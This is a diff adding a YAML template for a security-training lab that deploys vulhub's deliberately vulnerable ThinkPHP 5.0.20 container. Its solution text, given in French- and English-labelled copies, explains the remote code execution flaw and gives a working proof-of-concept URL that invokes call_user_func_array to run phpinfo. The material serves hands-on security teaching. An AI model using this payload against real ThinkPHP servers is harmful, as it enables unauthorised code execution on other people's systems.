@@ -1,0 +1,81 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-thinkphp-5-rce
+  name: ThinkPHP5 5.0.22/5.1.29 Remote Code Execution
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - thinkphp
+  description: ThinkPHP — ThinkPHP5 5.0.22/5.1.29 Remote Code Execution (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - rce
+    - thinkphp
+    difficulty: medium
+    summary: ThinkPHP5 5.0.22/5.1.29 Remote Code Execution
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+        ThinkPHP is an extremely widely used PHP development framework in China. In its version 5, as the framework processes controller name incorrectly, it can execute any method if the website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability.
+        Reference links：
+        - http://www.thinkphp.cn/topic/60400.html
+        - http://www.thinkphp.cn/topic/60390.html
+        - https://xz.aliyun.com/t/3570
+        # Environment Setup
+        Enter the following command：(ThinkPHP version:5.0.20)
+        $ docker compose up -d
+        Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
+        # POC
+        Directly visit `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1` and it'll execute the phpinfo：
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+        ThinkPHP is an extremely widely used PHP development framework in China. In its version 5, as the framework processes controller name incorrectly, it can execute any method if the website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability.
+        Reference links：
+        - http://www.thinkphp.cn/topic/60400.html
+        - http://www.thinkphp.cn/topic/60390.html
+        - https://xz.aliyun.com/t/3570
+        # Environment Setup
+        Enter the following command：(ThinkPHP version:5.0.20)
+        $ docker compose up -d
+        Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
+        # POC
+        Directly visit `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1` and it'll execute the phpinfo：
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_80
+    group:
+      fr: Accès
+      en: Access
+    label: web 80/tcp
+    type: port
+    default: 8080
+services:
+  web:
+    role: main
+    image: vulhub/thinkphp
+    tag: 5.0.20@sha256:aa12db1b982c92cfd599bc982c1244a4f7d34997461398b1a239df079558d56c
+    frozen: true
+    ports:
+    - container: 80
+      host: '{{ form.port_80 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
